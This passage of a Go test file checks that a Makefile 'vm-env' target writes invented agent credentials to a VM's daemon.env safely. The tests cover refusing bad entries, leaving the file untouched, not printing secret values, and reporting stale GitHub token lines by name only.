					t.Errorf("make -i vm-env VM_ENV=%s wrote a %s line into the VM's daemon.env although that name is refused: the write step must refuse it before it writes anything (issue #268 L2). The lines it wrote: %v",
						name, name, sortedEnvLines(string(got)))

					break
				}
			}

			assertNoDaemonEnvWrittenClaim(t, "make -i vm-env's output", text, "the name it was given is refused, so nothing was written")

			assertNoSecrets(t, "make -i vm-env's output", text, []secret{{kind: "value of " + name, value: value}})
		})
	}
}

// TestMakeVMEnvHidesAPastedTokenEntryUnderDashI pins issue #268 L1's write-step half: under make -i the write step
// runs although vm-env-check refused the second entry of VM_ENV, and its own message must hide that entry the way
// the check's does - only its position, never its text, which may be a token the maintainer pasted where a name
// goes. The entry never reaches standard output or standard error, and the VM's daemon.env stays as it was.
func TestMakeVMEnvHidesAPastedTokenEntryUnderDashI(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)

	entry := fakePastedTokenEntry("pasted-token")
	env := sb.vmEnvEnv()
	seeded := sb.seedDaemonEnv(t)

	// CLAUDE_CODE_OAUTH_TOKEN first and set, so the only reason to refuse is the pasted entry at position 2.
	stdout, stderr, err := runMake(t, []string{"-i", "vm-env", "VM_ENV=CLAUDE_CODE_OAUTH_TOKEN," + entry}, env)
	text := stdout + stderr

	got, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after make -i vm-env with a pasted token in VM_ENV: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make -i vm-env rewrote the VM's daemon.env although the second entry of VM_ENV is no variable name: a refused entry must leave the file as it was (issue #268 L2) (-want +got):\n%s\nmake's exit error: %v\nstdout: %s\nstderr: %s",
			diff, err, stdout, stderr)
	}

	assertEntryPositionNotShown(t, "make -i vm-env's output", text, 2, "the write step refused the pasted entry")

	assertNoSecrets(t, "make -i vm-env's output", text, []secret{{kind: "entry 2 of VM_ENV", value: entry}})

	assertNoDaemonEnvWrittenClaim(t, "make -i vm-env's output", text, "the entry it was given is refused, so nothing was written")

	assertNoCredentialValues(t, "make -i vm-env's output", text)
}

// TestMakeVMEnvSaysMayBeACredentialOnlyOfAHiddenEntry pins the third-round review's and audit's finding on issue
// #268: the sentence "It may be a credential typed by mistake." belongs to the message about the entry of VM_ENV
// whose text vm-env does not show, and to that message only. The shell code sets its flag for any hidden entry and
// never resets it, so a later message about a different entry that IS shown by name carried the sentence too:
// reverting the App variable the message names, "refusing SHIFT2EU_AGENTS_APP_X: ... It may be a credential typed by
// mistake." tells a maintainer that a name they typed on purpose may be a pasted credential, and the
// not-set-or-empty list said it whenever a hidden entry came before the name it lists.
//
// A hidden entry's own message keeps the sentence, and a list that mixes a hidden entry with an unset name says it
// once. The write step's refusal of a value holding a character a daemon.env line may not carry was written
// without the sentence at all: it names the entry by its position, and must warn too, as the entry it refuses that
// way may be the credential itself (issue #268 L1).
func TestMakeVMEnvSaysMayBeACredentialOnlyOfAHiddenEntry(t *testing.T) {
	t.Parallel()

	const (
		appName     = "SHIFT2EU_AGENTS_APP_X" // refused for what it is, and shown by name
		unsetName   = "FAKE_UNSET_NAME"       // an upper-case name no credential of the tests has
		pastedEntry = "pasted"
		digitLabel  = "api"
		mixedLabel  = "mixed"
		unsupported = "unsupported-value"
	)

	// hidden is an entry of VM_ENV the tests may not print: a valid variable name that is not the upper-case shape
	// of a credential name, so a message gives only its position.
	hidden := fakeLowerCaseName("app-entry")

	// The value of the entry the write step refuses for its characters: an invented value holding '@', which a
	// daemon.env line may not hold, so the write step refuses it although every credential is set (CLAUDE.md rule
	// 3: invented, and paired with no credential's name).
	unsupportedName := fakeLowerCaseName(unsupported)
	unsupportedValue := fakeEnvValue(unsupportedName) + "@"

	cases := []struct {
		name string
		args []string // make's arguments: the target, and the VM_ENV it hands as a command-line argument
		set  []string // names given an invented value in make's environment
		// values overrides the invented value of a name, for a value the write step refuses
		values map[string]string
		unset  []string // names left out of make's environment entirely
		// quiet are names the output shows: every line naming one of them must not carry the sentence
		quiet []string
		// hiddenAt are the 1-based positions in VM_ENV of the hidden entries whose own message must carry it
		hiddenAt []int
		// wantHints is how many times the sentence may appear in all of make's output
		wantHints int
		secrets   []secret // what no output may hold, and how a failure names it
		// refused is whether make itself must exit non-zero: make -i ignores the failed recipe and exits 0
		refused bool
		why     string
	}{
		{
			name:    "vm-env-check refuses an App name that comes after a hidden entry",
			args:    []string{"vm-env-check", "VM_ENV=" + hidden + "," + appName},
			set:     []string{hidden},
			quiet:   []string{appName},
			secrets: []secret{{kind: "entry 1 of VM_ENV", value: hidden}},
			refused: true,
			why:     "the entry it refuses is " + appName + ", which the refusal shows by name",
		},
		{
			name:    "vm-env-check lists an unset name that comes after a hidden entry",
			args:    []string{"vm-env-check", "VM_ENV=" + hidden + "," + unsetName},
			set:     []string{hidden},
			unset:   []string{unsetName},
			quiet:   []string{unsetName},
			secrets: []secret{{kind: "entry 1 of VM_ENV", value: hidden}},
			refused: true,
			why:     "the not-set-or-empty list names " + unsetName + ", an upper-case name that is shown",
		},
		{
			name:    "the write step lists an unset name that comes after a hidden entry",
			args:    []string{"-i", "vm-env", "VM_ENV=" + hidden + "," + unsetName},
			set:     []string{hidden},
			unset:   []string{unsetName},
			quiet:   []string{unsetName},
			secrets: []secret{{kind: "entry 1 of VM_ENV", value: hidden}},
			why:     "under make -i the check and the write step both report the unset " + unsetName + ", which is shown by name",
		},
		{
			name:      "a pasted token that is not set still says it may be a credential",
			args:      []string{"vm-env-check", "VM_ENV=CLAUDE_CODE_OAUTH_TOKEN," + fakePastedTokenEntry(pastedEntry)},
			unset:     []string{fakePastedTokenEntry(pastedEntry)},
			hiddenAt:  []int{2},
			wantHints: 1,
			secrets:   []secret{{kind: "entry 2 of VM_ENV", value: fakePastedTokenEntry(pastedEntry)}},
			refused:   true,
			why:       "the entry is not shown, so its own message must warn that it may be a credential typed by mistake",
		},
		{
			name:      "an entry that starts with a digit still says it may be a credential",
			args:      []string{"vm-env-check", "VM_ENV=" + fakeDigitFirstEntry(digitLabel)},
			hiddenAt:  []int{1},
			wantHints: 1,
			secrets:   []secret{{kind: "entry 1 of VM_ENV", value: fakeDigitFirstEntry(digitLabel)}},
			refused:   true,
			why:       "the per-name refusal hides the entry it refuses",
		},
		{
			name:      "a not-set list mixing a hidden entry and an unset name says it once",
			args:      []string{"vm-env-check", "VM_ENV=" + fakePastedTokenEntry(mixedLabel) + ",DEEPSEEK_API_KEY"},
			unset:     []string{fakePastedTokenEntry(mixedLabel), "DEEPSEEK_API_KEY"},
			hiddenAt:  []int{1},
			wantHints: 1,
			secrets:   []secret{{kind: "entry 1 of VM_ENV", value: fakePastedTokenEntry(mixedLabel)}},
			refused:   true,
			why:       "the list holds a hidden entry, so the sentence belongs on the list's one message, and once only",
		},
		{
			name:      "the write step's unsupported characters message for a hidden entry says it too",
			args:      []string{"-i", "vm-env", "VM_ENV=" + unsupportedName},
			values:    map[string]string{unsupportedName: unsupportedValue},
			hiddenAt:  []int{1},
			wantHints: 1,
			secrets: []secret{
				{kind: "entry 1 of VM_ENV", value: unsupportedName},
				{kind: "the value entry 1 holds", value: unsupportedValue},
			},
			why: "the write step refuses the value, and the entry it refuses to print may be the credential itself",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			for _, name := range tc.unset {
				delete(env, name)
			}

			for _, name := range tc.set {
				env[name] = fakeEnvValue(name)
			}

			for name, value := range tc.values {
				env[name] = value
			}

			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, tc.args, env)
			text := stdout + stderr

			if tc.refused && err == nil {
				t.Fatalf("make %s exited 0 although %s: it must refuse (issue #268)\nstdout: %s\nstderr: %s",
					strings.Join(tc.args, " "), tc.why, stdout, stderr)
			}

			// A name that is shown is named, so the case pins what it means to: the quiet check below is about
			// the message that names it, and would hold vacuously if no message named it at all.
			for _, name := range tc.quiet {
				if !strings.Contains(text, name) {
					t.Errorf("make's output does not name %s although %s, so nothing pins what its message may say (issue #268):\nstdout: %s\nstderr: %s",
						name, tc.why, stdout, stderr)
				}
			}

			// The sentence belongs to a hidden entry's own message, never to a message about a name that is shown.
			assertNoCredentialHint(t, "make's output", text, tc.quiet, tc.why)

			// A hidden entry's own message keeps it, or a maintainer cannot tell why the entry is hidden.
			for _, at := range tc.hiddenAt {
				assertHiddenEntrySaysMayBeACredential(t, "make's output", text, at, tc.why)
			}

			// Once per message, and never carried over into a later message about another entry.
			if got := mistakenEntrySentenceCount(text); got != tc.wantHints {
				t.Errorf("make's output holds the sentence %q %d time(s), want %d, although %s: a message about one entry of VM_ENV must not carry the sentence a message about another entry set (issue #268)\nstdout: %s\nstderr: %s",
					mistakenEntrySentence, got, tc.wantHints, tc.why, stdout, stderr)
			}

			assertNoSecrets(t, "make's output", text, tc.secrets)

			assertNoCredentialValues(t, "make's output", text)

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after make %s: %v", strings.Join(tc.args, " "), readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make %s rewrote the VM's daemon.env although it refused: the file must be byte for byte what it was (issue #268) (-want +got):\n%s\nmake's exit error: %v\nstdout: %s\nstderr: %s",
					strings.Join(tc.args, " "), diff, err, stdout, stderr)
			}

			// Every refusal here is made on the host, before anything is handed limactl.
			sb.assertNoLimaCalls(t, tc.why)
		})
	}
}

// TestMakeVMEnvRefusesADaemonEnvThatIsNotARegularFile pins issue #259's first item: vm-env writes the new
// daemon.env to a temporary file beside it and moves it into place, so a daemon.env that is a directory receives
// the temporary file *inside* itself and the run reports success - the VM then reads no credentials at all - and
// a daemon.env that is a symlink is replaced by the move, writing where the maintainer did not point the VM.
// vm-env must refuse such a file, in its own words and before it writes anything, in both modes: the default
// VM_ENV replaces the whole file, a VM_ENV on the command line merges. The file the maintainer has stays exactly
// as it is, so it can be fixed and the run repeated.
func TestMakeVMEnvRefusesADaemonEnvThatIsNotARegularFile(t *testing.T) {
	t.Parallel()

	// The two shapes a daemon.env can take that are no regular file, and the words that tell a maintainer what
	// is wrong with the file rather than that some command failed (issue #259; for a symlink "symlink, not a
	// regular file" fits as well, which holds the same words).
	const (
		directory = "directory"
		symlink   = "symlink"
	)

	cases := []struct {
		name  string
		shape string
		args  []string // a VM_ENV on the command line merges; nothing is the default VM_ENV, which replaces
		want  string   // a substring the refusal must hold, compared case-insensitively
	}{
		{name: "a directory, replacing", shape: directory, want: "not a regular file"},
		{name: "a directory, merging", shape: directory, want: "not a regular file", args: []string{"VM_ENV=DEEPSEEK_API_KEY"}},
		{name: "a symlink to a regular file, replacing", shape: symlink, want: "regular file"},
		{name: "a symlink to a regular file, merging", shape: symlink, want: "regular file", args: []string{"VM_ENV=DEEPSEEK_API_KEY"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			path := sb.daemonEnvPath()
			dir := filepath.Dir(path)

			// The regular file a symlink stands in for, holding a line an earlier run left: a refused run must
			// leave it alone as well. Its name matches no leftover the sweep removes.
			target := filepath.Join(dir, "daemon.env.symlinked-file")
			targetBody := []byte("INVENTED_SETTING=" + inventedVMEnvValue("symlink-target") + "\n")

			switch tc.shape {
			case directory:
				if err := os.MkdirAll(path, 0o700); err != nil {
					t.Fatalf("make the VM's daemon.env a directory: %v", err)
				}
			case symlink:
				writeFileMode(t, target, targetBody, 0o600)

				if err := os.Symlink(target, path); err != nil {
					t.Fatalf("make the VM's daemon.env a symlink: %v", err)
				}
			}

			stdout, stderr, err := runMake(t, append([]string{"vm-env"}, tc.args...), env)
			text, lower := stdout+stderr, strings.ToLower(stdout+stderr)

			if err == nil {
				t.Fatalf("make vm-env exited 0 although the VM's ~/.config/dot-agent-deck/daemon.env is a %s: the write moves a temporary file into place, so a %s is moved into or replaced instead of written, and the VM is left without the daemon.env its agents read (issue #259)\nstdout: %s\nstderr: %s",
					tc.shape, tc.shape, stdout, stderr)
			}

			if !strings.Contains(text, "daemon.env") {
				t.Errorf("make vm-env's refusal does not name daemon.env, so a maintainer cannot tell which file in the VM to look at (issue #259):\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			if !strings.Contains(lower, tc.want) {
				t.Errorf("make vm-env's refusal does not say %q, so a maintainer reads a failed command instead of a file that is not a regular file (issue #259):\nstdout: %s\nstderr: %s",
					tc.want, stdout, stderr)
			}

			// Nothing was written: the file the maintainer has is byte for byte what it was, in its own shape.
			switch tc.shape {
			case directory:
				info, statErr := os.Stat(path)
				if statErr != nil {
					t.Fatalf("stat the VM's daemon.env after a refused make vm-env: %v", statErr)
				}

				if !info.IsDir() {
					t.Errorf("make vm-env replaced the VM's daemon.env directory with a regular file: a refused run must write nothing (issue #259)")
				}

				entries, readDirErr := os.ReadDir(path)
				if readDirErr != nil {
					t.Fatalf("read the VM's daemon.env directory after a refused make vm-env: %v", readDirErr)
				}

				if len(entries) != 0 {
					t.Errorf("make vm-env moved %d file(s) into the VM's daemon.env directory: a directory called daemon.env receives the temporary file the write moves into place, so a refused run must write nothing at all (issue #259)", len(entries))
				}
			case symlink:
				info, lstatErr := os.Lstat(path)
				if lstatErr != nil {
					t.Fatalf("lstat the VM's daemon.env after a refused make vm-env: %v", lstatErr)
				}

				if info.Mode()&fs.ModeSymlink == 0 {
					t.Errorf("make vm-env replaced the VM's daemon.env symlink with a file of its own, so the run wrote where the maintainer did not point the VM: a refused run must write nothing (issue #259)")
				} else if resolved, readlinkErr := os.Readlink(path); readlinkErr != nil || resolved != target {
					t.Errorf("make vm-env repointed the VM's daemon.env symlink: a refused run must leave it as it was (issue #259), readlink error: %v", readlinkErr)
				}

				body, readErr := os.ReadFile(target)
				if readErr != nil {
					t.Fatalf("read the file the VM's daemon.env symlink stands in for: %v", readErr)
				}

				if diff := cmp.Diff(string(targetBody), string(body)); diff != "" {
					t.Errorf("make vm-env rewrote the file the VM's daemon.env symlink points at although it refused: a refused run must write nothing (issue #259) (-want +got):\n%s", diff)
				}
			}

			assertNoCredentialValues(t, "make vm-env's output", text)
		})
	}
}

// TestMakeVMEnvDoesNotCountBlankLinesOfAMerge pins the decision recorded on issue #259's fourth item: a merge
// drops the blank lines of the VM's daemon.env and documents that it does, so they are not kept and they are not
// counted either - the "dropped N line(s)" warning is about lines that held something a maintainer may miss (a
// command, a comment, an assignment the shell would expand), and a blank line held nothing. A file whose blank
// lines are the only thing dropped gets no warning at all, or a maintainer learns to ignore it.
func TestMakeVMEnvDoesNotCountBlankLinesOfAMerge(t *testing.T) {
	t.Parallel()

	// One of the names VM_ENV still lists (PRD #161 milestone 3), so the merge has a line to replace and the
	// others of the earlier file to count or keep.
	const narrowed = "DEEPSEEK_API_KEY"

	cases := []struct {
		name string
		body string // the daemon.env the VM already has, blank lines and all
		// dropped is how many lines the merge must report dropping: the ones that were no blank line and no
		// plain NAME=value assignment.
		dropped int
	}{
		{
			name: "blank lines are the only thing the merge drops",
			body: "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\n\nINVENTED_SETTING=old-value\n\n\n",
		},
		{
			name:    "blank lines beside a line the merge drops",
			body:    "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\n\n# a note\n\nINVENTED_SETTING=old-value\n\n",
			dropped: 1,
		},
	}

	droppedWarning := regexp.MustCompile(`(?i)dropped\s+(\d+)\s+line`)

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			writeFileMode(t, sb.daemonEnvPath(), []byte(tc.body), 0o600)

			stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + narrowed}, env)
			if err != nil {
				t.Fatalf("make vm-env VM_ENV=%s with every credential set: %v\nstdout: %s\nstderr: %s", narrowed, err, stdout, stderr)
			}

			text := stdout + stderr

			match := droppedWarning.FindStringSubmatch(text)

			switch {
			case tc.dropped == 0 && match != nil:
				t.Errorf("make vm-env VM_ENV=%s warns that it dropped %s line(s) although the earlier daemon.env held no line but blank ones to drop: blank lines are documented as not kept, and counting them tells a maintainer that a setting was lost when none was (issue #259)\nstdout: %s\nstderr: %s",
					narrowed, match[1], stdout, stderr)
			case tc.dropped > 0 && match == nil:
				t.Errorf("make vm-env VM_ENV=%s dropped %d line(s) of the earlier daemon.env without saying how many: the count is the lines that held something, never the blank ones (issue #259)\nstdout: %s\nstderr: %s",
					narrowed, tc.dropped, stdout, stderr)
			case tc.dropped > 0 && match[1] != strconv.Itoa(tc.dropped):
				t.Errorf("make vm-env VM_ENV=%s warns that it dropped %s line(s), want %d: the count is every line of the earlier daemon.env that held something and is no plain NAME=value assignment, and no blank line is one of them (issue #259)\nstdout: %s\nstderr: %s",
					narrowed, match[1], tc.dropped, stdout, stderr)
			}

			body, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env: %v", readErr)
			}

			// Not kept: the file the login shell sources holds assignments and nothing else.
			if blanks := blankLines(string(body)); blanks != 0 {
				t.Errorf("make vm-env VM_ENV=%s kept %d blank line(s) of the earlier daemon.env: a merge keeps only plain NAME=value lines, and a blank line is not one (issue #259). The lines it wrote: %v",
					narrowed, blanks, sortedEnvLines(string(body)))
			}

			want := []string{
				"CLAUDE_CODE_OAUTH_TOKEN=old-oauth",
				"INVENTED_SETTING=old-value",
				narrowed + "=" + fakeEnvValue(narrowed),
			}

			if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
				t.Errorf("make vm-env VM_ENV=%s wrote the wrong lines to the VM's daemon.env: a merge keeps every plain NAME=value line it does not name and replaces its own (issue #259) (-want +got):\n%s",
					narrowed, diff)
			}

			assertNoCredentialValues(t, "make vm-env's output", text)
		})
	}
}

// TestMakeVMEnvRefusalSaysHowToFixIt pins that the refusal is actionable, in the order a maintainer needs it:
// unlock the login Keychain (a macOS SSH session, where the credentials come from the Keychain), re-enter the
// checkout so direnv reloads the .envrc (other hosts, where they come from direnv), then run make vm-env again.
func TestMakeVMEnvRefusalSaysHowToFixIt(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	delete(env, "CLAUDE_CODE_OAUTH_TOKEN")

	stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
	if err == nil {
		t.Fatalf("make vm-env exited 0 with CLAUDE_CODE_OAUTH_TOKEN missing: it must refuse (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	text := stdout + stderr

	// The steps, in the order the refusal must name them: unlocking the Keychain first (the macOS case), then
	// re-entering the checkout so direnv reloads the .envrc, then the target again. The wording around them is
	// not pinned, the steps and their order are.
	steps := []string{
		"security unlock-keychain",
		"~/Library/Keychains/login.keychain-db",
		"cd ~ && cd",
		"make vm-env",
	}

	at := -1
	previous := ""

	for _, step := range steps {
		next := strings.Index(text, step)
		if next < 0 {
			t.Errorf("the refusal never mentions %q, so a maintainer whose Keychain is locked or whose .envrc is not loaded does not learn what to do (issue #234):\nstdout: %s\nstderr: %s", step, stdout, stderr)

			continue
		}

		if next < at {
			t.Errorf("the refusal mentions %q before %q: it must name the steps in the order they are done - unlock the login Keychain, re-enter the checkout so direnv reloads the .envrc, then run make vm-env again (issue #234):\nstdout: %s\nstderr: %s",
				step, previous, stdout, stderr)
		}

		at, previous = next, step
	}

	// The non-macOS host, where the credentials come from direnv.
	if !strings.Contains(text, ".envrc") {
		t.Errorf("the refusal does not name the direnv .envrc, the source of the credentials on a host without the login Keychain (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The refusal is made before the VM is touched: no connection, nothing written there.
	sb.assertNoLimaCalls(t, "a missing credential is refused")

	assertNoCredentialValues(t, "make vm-env's refusal", text)
}

// TestMakeVMEnvRefusesAnEmptyVMEnv pins where the narrowed merge stops (issue #234 review): `make vm-env
// VM_ENV=` names nothing at all, and vm-env must refuse it. A merge with nothing named replaces nothing and
// would leave the file as it was - or, as it did, append a blank line - while a replacement would empty it: both
// are a daemon.env the agents cannot start with. Every credential is set, so the refusal can only be about the
// empty VM_ENV, and the file stays byte for byte as it was.
func TestMakeVMEnvRefusesAnEmptyVMEnv(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	seeded := sb.seedDaemonEnv(t)

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV="}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env VM_ENV= exited 0: an empty VM_ENV names no credential, so it must be refused instead of leaving a daemon.env without the credentials the agents need (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if !strings.Contains(text, "VM_ENV") {
		t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the empty VM_ENV is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	lower := strings.ToLower(text)
	if !strings.Contains(lower, "empty") && !strings.Contains(lower, "names nothing") {
		t.Errorf("the refusal does not say that the VM_ENV it was given is empty and names nothing: a silent non-zero exit reads like a broken target, not like a typo in VM_ENV (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	sb.assertNoLimaCalls(t, "an empty VM_ENV is refused")

	got, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env although VM_ENV named nothing: the file must be byte for byte what it was, so no blank line is appended either (issue #234) (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", text)
}

// tokenLineValue stands where a non-canonical GitHub token line holds its value, so that no literal in these
// tests pairs a token's name with a value (gosec G101, CLAUDE.md rule 3).
const tokenLineValue = "<the value>"

// nonCanonicalTokenLines are the other shapes a GitHub token line takes in a daemon.env, beside the plain
// NAME=value line and the one behind a bare `export` (the canonical cases of the two tables that use this):
// spaces around the `=`, a line behind `declare -x`, and one behind an `export` with a leading tab and a quoted
// value. The auditor found that the VM-side name read matched only the canonical shapes, so these lines left
// the VM without a warning although each holds the same token. Both a replace and a merge must name the
// variable in the warning and write no line of it, and neither may print its value (PRD #161 milestone 3).
var nonCanonicalTokenLines = []struct {
	name     string // the line's shape, for the subtest's name
	variable string // the one GitHub token it holds, so a warning that named another is a failure
	line     string // the line itself, with tokenLineValue where its value goes
}{ // a variable's name is no credential: tokenLineValue stands where its value would go
	{name: "with spaces around the =", variable: "GITHUB_TOKEN", line: "GITHUB_TOKEN = " + tokenLineValue},
	{name: "behind declare -x", variable: "GH_TOKEN", line: "declare -x GH_TOKEN=" + tokenLineValue},
	{
		name:     "behind an export, with a leading tab and a quoted value",
		variable: "GITHUB_ENTERPRISE_TOKEN",
		line:     "\texport GITHUB_ENTERPRISE_TOKEN=\"" + tokenLineValue + " with a space\"",
	},
}

// TestMakeVMEnvWritesTheCredentialsItNames pins what a run with every credential set writes to the VM's
// daemon.env, mode 0600, whether the VM has the file yet or not (issue #234). VM_ENV decides the rest: the
// default VM_ENV replaces the whole file, so a line it does not name - a stale ANTHROPIC_API_KEY left by an
// earlier setup, which silently switches Claude Code to pay-as-you-go billing - never survives a full run.
// So does a VM_ENV exported in make's environment: only one given on the make command line merges, and a
// command-line VM_ENV keeps every plain line it does not name, so `make vm-env VM_ENV=DEEPSEEK_API_KEY`
// drops nothing (the decision and its second-round correction on issue #234).
//
// A replace that drops a maintainer's GitHub token line (PRD #161 milestone 3) is pinned here as well: that
// line sat in a file the login shell of every agent the VM starts sources, so the drop must not be silent.
// make names the variable it removed and says to revoke that token at GitHub, and it never prints the value,
// which is the credential itself - while a file that held no such line gets no such note. The line is pinned in
// every shape a login shell reads a variable in, not only the canonical NAME=value and its bare `export`
// (nonCanonicalTokenLines).
func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
	t.Parallel()

	// replaceCase is one run whose VM_ENV replaces the whole file (the default, or one exported in make's
	// environment): what it writes, and which line of the earlier daemon.env it must report having removed.
	type replaceCase struct {
		name string
		seed bool // the VM already has a daemon.env, as after an earlier make vm-env
		// extra are the lines of an earlier daemon.env that VM_ENV does not name.
		extra []string
		// args are further arguments on the make command line - an explicit VM_ENV, which is what decides
		// whether the file is replaced or merged.
		args []string
		// envVMEnv is a VM_ENV exported in make's environment rather than given on the command line: it does
		// not merge, so the whole file is replaced as by the default VM_ENV.
		envVMEnv string
		// kept are the lines of the earlier daemon.env that survive the run: an explicit VM_ENV replaces only
		// the names it lists and keeps every other line.
		kept []string
		// removedName is the variable an earlier daemon.env's stale line holds (one of gitHubTokens), in any of
		// the shapes a login shell reads it in - the canonical ones and those of nonCanonicalTokenLines: a
		// replace removes it and must report having done so. Empty when the earlier file held no GitHub token
		// line, so the run must say nothing about one.
		removedName string
		// removedValue is the invented value that line holds, which no output may print.
		removedValue string
	}

	cases := []replaceCase{
		{name: "the VM has no daemon.env yet, the first run"},
		{name: "the VM has a daemon.env already", seed: true},
		{
			name:  "the default VM_ENV replaces a line it does not name",
			seed:  true,
			extra: []string{"UNRELATED_SETTING=not-kept-by-the-default"},
		},
		{
			// A VM set up before PRD #161 milestone 3 still holds the maintainer's personal token in its
			// daemon.env. The default VM_ENV no longer names it, so a plain run replaces the whole file and the
			// token leaves the VM: nothing reads it any more (dev/gh-app-token.sh has no fallback). The drop is
			// not silent either - the line sat where every agent of the VM could read it.
			name:         "a GITHUB_TOKEN line an earlier VM was set up with is dropped",
			seed:         true,
			extra:        []string{"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN")},
			removedName:  "GITHUB_TOKEN",
			removedValue: fakeEnvValue("GITHUB_TOKEN"),
		},
		{
			// The same kind of line behind an `export` a hand edit added: the leading `export` hides neither the
			// line from the removal nor its variable from the note.
			name:         "an exported GH_TOKEN line a hand edit added is dropped",
			seed:         true,
			extra:        []string{"export GH_TOKEN=" + fakeEnvValue("GH_TOKEN")},
			removedName:  "GH_TOKEN",
			removedValue: fakeEnvValue("GH_TOKEN"),
		},
		{
			name:  "a VM_ENV exported in the environment replaces a line it does not name",
			seed:  true,
			extra: []string{"UNRELATED_SETTING=not-kept-by-the-environment"},
			// The same names the default VM_ENV lists, so only where the VM_ENV comes from tells the two
			// cases apart: in the environment it must still replace the whole file.
			envVMEnv: strings.Join(vmEnvCredentials, ","),
		},
		{
			name:  "an explicit VM_ENV merges and keeps a line it does not name",
			seed:  true,
			extra: []string{"UNRELATED_SETTING=kept-by-the-merge"},
			args:  []string{"VM_ENV=" + strings.Join(vmEnvCredentials, ",")},
			kept:  []string{"UNRELATED_SETTING=kept-by-the-merge"},
		},
		{
			// The variable's name holds a token's spelling without being one: a replace drops the line with
			// every other line it does not name, but it must not report it as a GitHub token, because a
			// maintainer would then revoke a token that never existed (PRD #161 milestone 3).
			name:  "a MY_GITHUB_TOKEN line is no GitHub token line",
			seed:  true,
			extra: []string{"MY_GITHUB_TOKEN=" + fakeEnvValue("MY_GITHUB_TOKEN")},
		},
	}

	// The non-canonical shapes of a GitHub token line, which a replace must remove and report like the plain
	// one (PRD #161 milestone 3, the auditor's finding).
	for _, form := range nonCanonicalTokenLines {
		value := fakeEnvValue(form.variable)

		cases = append(cases, replaceCase{
			name:         "a " + form.variable + " line " + form.name + " is dropped",
			seed:         true,
			extra:        []string{strings.ReplaceAll(form.line, tokenLineValue, value)},
			removedName:  form.variable,
			removedValue: value,
		})
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			if tc.envVMEnv != "" {
				env = withVMEnvInEnv(env, tc.envVMEnv)
			}

			if tc.seed {
				sb.seedDaemonEnvWith(t, tc.extra...)
			}

			stdout, stderr, err := runMake(t, append([]string{"vm-env"}, tc.args...), env)
			if err != nil {
				t.Fatalf("make vm-env %s with every credential set: %v\nstdout: %s\nstderr: %s",
					strings.Join(tc.args, " "), err, stdout, stderr)
			}

			info, statErr := os.Stat(sb.daemonEnvPath())
			if statErr != nil {
				t.Fatalf("make vm-env wrote no ~/.config/dot-agent-deck/daemon.env in the VM: %v", statErr)
			}

			if got := info.Mode().Perm(); got != 0o600 {
				t.Errorf("the VM's daemon.env is mode %04o, want 0600: it holds the agent credentials (issue #234, PRD #161 milestone 1)", got)
			}

			body, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env: %v", readErr)
			}

			want := []string{
				"CLAUDE_CODE_OAUTH_TOKEN=" + fakeEnvValue("CLAUDE_CODE_OAUTH_TOKEN"),
				"DEEPSEEK_API_KEY=" + fakeEnvValue("DEEPSEEK_API_KEY"),
			}
			// The default VM_ENV and one exported in the environment write the whole file; only a
			// command-line VM_ENV keeps every other plain line, so a setting vm-env does not know about is
			// never lost by a merge (the decision on issue #234).
			want = append(want, tc.kept...)

			if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
				t.Errorf("make vm-env wrote the wrong lines to the VM's daemon.env (-want +got):\n%s", diff)
			}

			text := stdout + stderr

			// A note about a token must be about the one line that was really there (PRD #161 milestone 3):
			// naming another variable would send a maintainer to revoke a credential the VM never held.
			for _, name := range gitHubTokens {
				if name != tc.removedName && strings.Contains(text, name) {
					t.Errorf("make vm-env's output names %s although the VM's daemon.env held no %s line: a note must name only the variable it really removed, and the other names are the spellings it must look for (PRD #161 milestone 3)\nstdout: %s\nstderr: %s",
						name, name, stdout, stderr)
				}
